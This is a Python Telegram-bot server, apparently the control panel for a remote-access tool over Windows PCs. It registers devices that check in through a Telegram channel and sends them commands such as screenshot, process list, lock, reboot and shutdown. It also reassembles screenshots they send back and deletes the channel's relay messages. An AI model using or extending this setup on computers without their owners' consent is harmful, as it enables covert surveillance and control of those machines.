import asyncio
import os
import base64
import sqlite3
import time
from aiogram import Bot, Dispatcher, types, F
from aiogram.filters import Command
from aiogram.types import InlineKeyboardMarkup, InlineKeyboardButton, BufferedInputFile
from dotenv import load_dotenv

load_dotenv()
TOKEN = os.getenv("BOT_TOKEN")  # Токен БОТА №1
ADMIN_ID = 5153650495  # Твой ID
CHANNEL_USERNAME = "hurghgruuruhgrughuhgur47846776v7" 

bot = Bot(token=TOKEN)
dp = Dispatcher()

# Буфер для сборки частей скриншотов {device_id: {part_index: text_data}}
screenshot_buffers = {}

# --- РАБОТА С БАЗОЙ ДАННЫХ SQLite ---
DB_PATH = os.path.join(os.path.dirname(__file__), "devices.db")

def init_db():
    conn = sqlite3.connect(DB_PATH)
    cursor = conn.cursor()
    cursor.execute("""
        CREATE TABLE IF NOT EXISTS devices (
            device_id TEXT PRIMARY KEY,
            name TEXT,
            last_seen INTEGER,
            is_notified INTEGER DEFAULT 0
        )
    """)
    conn.commit()
    conn.close()

def update_device_in_db(device_id, name, is_notified=None):
    conn = sqlite3.connect(DB_PATH)
    cursor = conn.cursor()
    current_time = int(time.time())
    
    cursor.execute("SELECT is_notified FROM devices WHERE device_id = ?", (device_id,))
    row = cursor.fetchone()
    
    if row is None:
        # Новое устройство
        notif = is_notified if is_notified is not None else 0
        cursor.execute("INSERT INTO devices (device_id, name, last_seen, is_notified) VALUES (?, ?, ?, ?)",
                       (device_id, name, current_time, notif))
        status = "new"
    else:
        # Старое устройство
        if is_notified is not None:
            cursor.execute("UPDATE devices SET name = ?, last_seen = ?, is_notified = ? WHERE device_id = ?",
                           (name, current_time, is_notified, device_id))
        else:
            cursor.execute("UPDATE devices SET name = ?, last_seen = ? WHERE device_id = ?",
                           (name, current_time, device_id))
        status = "exists"
        
    conn.commit()
    conn.close()
    return status

def get_all_devices():
    conn = sqlite3.connect(DB_PATH)
    cursor = conn.cursor()
    cursor.execute("SELECT device_id, name, last_seen FROM devices")
    rows = cursor.fetchall()
    conn.close()
    return rows

def get_device(device_id):
    conn = sqlite3.connect(DB_PATH)
    cursor = conn.cursor()
    cursor.execute("SELECT name, last_seen, is_notified FROM devices WHERE device_id = ?", (device_id,))
    row = cursor.fetchone()
    conn.close()
    return row

# --- ИНТЕРФЕЙС И КНОПКИ ---

def get_main_menu():
    return InlineKeyboardMarkup(inline_keyboard=[[InlineKeyboardButton(text="📋 Список устройств", callback_data="back_to_list")]])

def get_device_menu(device_id: str):
    return InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text="📊 Инфо и Мониторинг", callback_data=f"cat_mon_{device_id}")],
        [InlineKeyboardButton(text="⚙️ Системные действия", callback_data=f"cat_sys_{device_id}")],
        [InlineKeyboardButton(text="🌐 Открытие ресурсов", callback_data=f"cat_web_{device_id}")],
        [InlineKeyboardButton(text="🛠 Утилиты и Приложения", callback_data=f"cat_util_{device_id}")],
        [InlineKeyboardButton(text="⬅️ В главное меню", callback_data="go_to_main_start")]
    ])

@dp.message(Command("start"))
async def cmd_start(message: types.Message):
    if message.from_user.id != ADMIN_ID: return
    await message.answer("🤖 Панель управления Windows готова. Все данные сохранены в БД.", reply_markup=get_main_menu())

# --- ФИКС: Безопасный выход в главное меню из-под медиа ---
@dp.callback_query(F.data == "go_to_main_start")
async def go_to_main_start(callback: types.CallbackQuery):
    text = "🤖 **Главное меню**"
    markup = get_main_menu()
    
    if callback.message.photo or callback.message.document:
        await callback.message.edit_caption(caption=text, parse_mode="Markdown", reply_markup=markup)
    else:
        await callback.message.edit_text(text=text, parse_mode="Markdown", reply_markup=markup)

@dp.callback_query(F.data == "back_to_list")
async def show_devices_callback(callback: types.CallbackQuery):
    devices = get_all_devices()
    if not devices:
        await callback.message.edit_text("❌ Список устройств в базе данных пуст.", reply_markup=get_main_menu())
        return
    
    keyboard = []
    current_time = int(time.time())
    
    for dev_id, name, last_seen in devices:
        if current_time - last_seen < 180:
            status_emoji = "🟢"
        else:
            status_emoji = "🔴"
            
        keyboard.append([InlineKeyboardButton(text=f"{status_emoji} {name}", callback_data=f"manage_{dev_id}")])
        
    await callback.message.edit_text("🎛 **Список устройств из Базы Данных:**", parse_mode="Markdown", reply_markup=InlineKeyboardMarkup(inline_keyboard=keyboard))

# --- ФИКС: Безопасный возврат назад из-под скриншота ---
@dp.callback_query(F.data.startswith("manage_"))
async def manage_device(callback: types.CallbackQuery):
    device_id = callback.data.split("_")[1]
    device_info = get_device(device_id)
    if not device_info: 
        await callback.answer("❌ Устройство удалено или не найдено.")
        return
    
    current_time = int(time.time())
    status_str = "🟢 Онлайн" if current_time - device_info[1] < 180 else "🔴 Оффлайн"
    
    text = f"💻 Управление ПК: *{device_info[0]}*\nСтатус: {status_str}\n🆔 ID: `{device_id}`"
    markup = get_device_menu(device_id)
    
    if callback.message.photo or callback.message.document:
        await callback.message.edit_caption(caption=text, parse_mode="Markdown", reply_markup=markup)
    else:
        await callback.message.edit_text(text=text, parse_mode="Markdown", reply_markup=markup)

@dp.callback_query(F.data.startswith("cat_"))
async def handle_categories(callback: types.CallbackQuery):
    data = callback.data.split("_")
    cat, dev_id = data[1], data[2]
    
    keyboard = []
    text = ""
    
    if cat == "mon":
        keyboard = [
            [InlineKeyboardButton(text="📸 Скриншот", callback_data=f"cmd_screen_{dev_id}")],
            [InlineKeyboardButton(text="📋 Процессы", callback_data=f"cmd_tasklist_{dev_id}")],
            [InlineKeyboardButton(text="🔊 Звук макс.", callback_data=f"cmd_volmax_{dev_id}")],
            [InlineKeyboardButton(text="⬅️ Назад", callback_data=f"manage_{dev_id}")]
        ]
        text = "📊 **Мониторинг**"
    elif cat == "sys":
        keyboard = [
            [InlineKeyboardButton(text="🔒 Блок экрана", callback_data=f"cmd_lock_{dev_id}")],
            [InlineKeyboardButton(text="🌙 Сон", callback_data=f"cmd_sleep_{dev_id}")],
            [InlineKeyboardButton(text="🔄 Перезагрузка", callback_data=f"cmd_reboot_{dev_id}")],
            [InlineKeyboardButton(text="🛑 Выключение", callback_data=f"cmd_shutdown_{dev_id}")],
            [InlineKeyboardButton(text="⬅️ Назад", callback_data=f"manage_{dev_id}")]
        ]
        text = "⚙️ **Система**"
    elif cat == "web":
        keyboard = [
            [InlineKeyboardButton(text="🌐 YouTube", callback_data=f"cmd_yt_{dev_id}")],
            [InlineKeyboardButton(text="🔍 Google", callback_data=f"cmd_google_{dev_id}")],
            [InlineKeyboardButton(text="🗺 Карты", callback_data=f"cmd_maps_{dev_id}")],
            [InlineKeyboardButton(text="💬 Сообщение", callback_data=f"cmd_msg_{dev_id}")],
            [InlineKeyboardButton(text="⬅️ Назад", callback_data=f"manage_{dev_id}")]
        ]
        text = "🌐 **Ресурсы**"
    elif cat == "util":
        keyboard = [
            [InlineKeyboardButton(text="🧮 Калькулятор", callback_data=f"cmd_calc_{dev_id}")],
            [InlineKeyboardButton(text="📝 Блокнот", callback_data=f"cmd_notepad_{dev_id}")],
            [InlineKeyboardButton(text="🎨 Paint", callback_data=f"cmd_paint_{dev_id}")],
            [InlineKeyboardButton(text="⏳ Скринывер", callback_data=f"cmd_scr_{dev_id}")],
            [InlineKeyboardButton(text="⬅️ Назад", callback_data=f"manage_{dev_id}")]
        ]
        text = "🛠 **Утилиты**"
    else:
        return

    markup = InlineKeyboardMarkup(inline_keyboard=keyboard)

    if callback.message.photo or callback.message.document:
        await callback.message.edit_caption(caption=text, parse_mode="Markdown", reply_markup=markup)
    else:
        await callback.message.edit_text(text=text, parse_mode="Markdown", reply_markup=markup)

@dp.callback_query(F.data.startswith("cmd_"))
async def send_command(callback: types.CallbackQuery):
    _, cmd_type, device_id = callback.data.split("_", 2)
    try:
        await bot.send_message(chat_id=f"@{CHANNEL_USERNAME}", text=f"CMD:{device_id}:{cmd_type}")
        await callback.answer("🚀 Команда отправлена!")
    except:
        await callback.answer("❌ Ошибка отправки.")

# --- ПРИЕМ ДАННЫХ ИЗ КАНАЛА ---

@dp.channel_post(F.text.startswith("INIT_START:"))
async def handle_client_startup(message: types.Message):
    try:
        _, device_id, pc_name = message.text.split(":")
        update_device_in_db(device_id, pc_name, is_notified=0)
        await bot.send_message(
            chat_id=ADMIN_ID, 
            text=f"⚡️ **Клиент запущен на ПК!**\n💻 Имя: `{pc_name}`\n🟢 Устройство сейчас активно.", 
            parse_mode="Markdown",
            reply_markup=get_device_menu(device_id)
        )
        await message.delete()
    except: pass

@dp.channel_post(F.text.startswith("PING:"))
async def handle_channel_ping(message: types.Message):
    try:
        _, device_id, pc_name = message.text.split(":")
        
        dev = get_device(device_id)
        current_time = int(time.time())
        
        if not dev:
            update_device_in_db(device_id, pc_name, is_notified=1)
            await bot.send_message(chat_id=ADMIN_ID, text=f"🆕 **Зарегистрирован новый ПК:** `{pc_name}`", parse_mode="Markdown", reply_markup=get_device_menu(device_id))
        else:
            last_seen, is_notified = dev[1], dev[2]
            if current_time - last_seen >= 180 or is_notified == 0:
                update_device_in_db(device_id, pc_name, is_notified=1)
                await bot.send_message(chat_id=ADMIN_ID, text=f"🟢 **ПК `{pc_name}` снова на связи!**", parse_mode="Markdown", reply_markup=get_device_menu(device_id))
            else:
                update_device_in_db(device_id, pc_name)
                
        await message.delete()
    except: pass

@dp.channel_post(F.text.startswith("SCR_PART:"))
async def receive_screenshot_part(message: types.Message):
    try:
        _, device_id, part_num, total_parts, base64_chunk = message.text.split(":", 4)
        part_num = int(part_num)
        total_parts = int(total_parts)
        
        if device_id not in screenshot_buffers:
            screenshot_buffers[device_id] = {}
            
        screenshot_buffers[device_id][part_num] = base64_chunk
        await message.delete()
        
        if len(screenshot_buffers[device_id]) == total_parts:
            pc_name = get_device(device_id)[0] if get_device(device_id) else "ПК"
            full_base64 = "".join([screenshot_buffers[device_id][i] for i in range(total_parts)])
            del screenshot_buffers[device_id]
            
            image_bytes = base64.b64decode(full_base64)
            await bot.send_photo(
                chat_id=ADMIN_ID,
                photo=BufferedInputFile(image_bytes, filename="screenshot.jpg"),
                caption=f"📸 Скриншот с ПК: *{pc_name}*",
                parse_mode="Markdown",
                reply_markup=get_device_menu(device_id)
            )
    except: pass

@dp.channel_post(F.text.startswith("LOG_REPLY:"))
async def receive_channel_log(message: types.Message):
    try:
        text_data = message.text.replace("LOG_REPLY:", "")
        device_id = None
        for dev_id, name, _ in get_all_devices():
            if name in text_data:
                device_id = dev_id
                break
        await bot.send_message(chat_id=ADMIN_ID, text=text_data, parse_mode="Markdown", reply_markup=get_device_menu(device_id) if device_id else None)
        await message.delete()
    except: pass

async def main():
    init_db()
    print("[СЕРВЕР] База данных подключена. Ожидание сигналов...")
    await dp.start_polling(bot)

if __name__ == "__main__":
    asyncio.run(main())
